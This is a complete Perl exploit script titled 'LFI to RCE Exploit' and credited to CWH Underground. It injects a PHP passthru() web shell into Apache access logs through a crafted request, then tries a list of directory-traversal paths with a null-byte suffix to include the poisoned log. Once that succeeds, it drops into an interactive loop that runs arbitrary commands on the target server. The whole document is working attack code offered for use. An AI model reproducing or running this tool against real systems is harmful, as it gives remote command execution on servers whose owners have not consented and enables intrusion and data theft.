use LWP::UserAgent;
use IO::Socket;
use LWP::Simple;

$log="../";
@apache=(
    "../../../../../var/log/httpd/access_log",
    "../apache/logs/access.log",
    "../../apache/logs/access.log",
    "../../../apache/logs/access.log",
    "../../../../apache/logs/access.log",
    "../../../../../apache/logs/access.log",
    "../logs/access.log",
    "../../logs/access.log",
    "../../../logs/access.log",
    "../../../../logs/access.log",
    "../../../../../logs/access.log",
    "../../../../../etc/httpd/logs/access_log",
    "../../../../../etc/httpd/logs/access.log",
    "../../.. /../../var/www/logs/access_log",
    "../../../../../var/www/logs/access.log",
    "../../../../../usr/local/apache/logs/access_log",
    "../../../../../usr/local/apache/logs/access.log",
    "../../../../../var/log/apache/access_log",
    "../../../../../var/log/apache/access.log",
    "../../../../../var/log/access_log",
    "../../../../../var/log/access_log"
);

my $sis="$^O";if ($sis eq 'MSWin32') { system("cls"); } else { system("clear"); }

print "\n==========================================\n";
print "		   LFI to RCE Exploit \n";
print "		   By CWH Underground \n";
print "==========================================\n";

if (@ARGV < 2)
{
    print "Usage: ./xpl.pl <Host> <Path>\n";
    print "Ex. ./xpl.pl www.hackme.com /ktp/index.php?page=\n";
}

$host=$ARGV[0];
$path=$ARGV[1];
$cookie='';

if ( $host   =~   /^http:/ ) {$host =~ s/http:\/\///g;}

print "\nTrying to Inject the Code...\n";
$CODE="<?php if(get_magic_quotes_gpc()){ \$_GET[cmd]=stripslashes(\$_GET[cmd]);} passthru(\$_GET[cmd]);?>";
$socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$host", PeerPort=>"80") or die "Could not connect to host.\n\n";
print $socket "GET /cwhunderground "."\#\#%\$\$%\#\#".$CODE."\#\#%\$\$%\#\#"." HTTP/1.1\r\n";
print $socket "Host: ".$host."\r\n";
print $socket "Cookie: ".$cookie."\r\n";
print $socket "Connection: close\r\n\r\n";
close($socket);

if ( $host   !~   /^http:/ ) {$host = "http://" . $host;}

foreach $getlog(@apache) {
    chomp($getlog);
    $find= $host.$path.$getlog."%00";
    $xpl = LWP::UserAgent->new() or die "Could not initialize browser\n";
    $req = HTTP::Request->new(GET => $find);
    $res = $xpl->request($req);
    $info = $res->content;
    if($info =~ /cwhunderground/) {
        print "\nSuccessfully injected in $getlog \n";$log=$getlog;}
    }

    print "cwh-shell# ";
    chomp( $cmd = <STDIN> );

    while($cmd !~ "exit") {
		$shell= $host.$path.$log."%00&cmd=$cmd";
		$xpl = LWP::UserAgent->new() or die "Could not initialize browser\n";
		$req = HTTP::Request->new(GET => $shell);
		$res = $xpl->request($req);
		$info = $res->content;
		if ($info =~ /\#\#%\$\$%\#\#(.*?)\#\#%\$\$%\#\#/sg) {
            print $1;
        }
		print "cwh-shell# ";
		chomp( $cmd = <STDIN> );
}
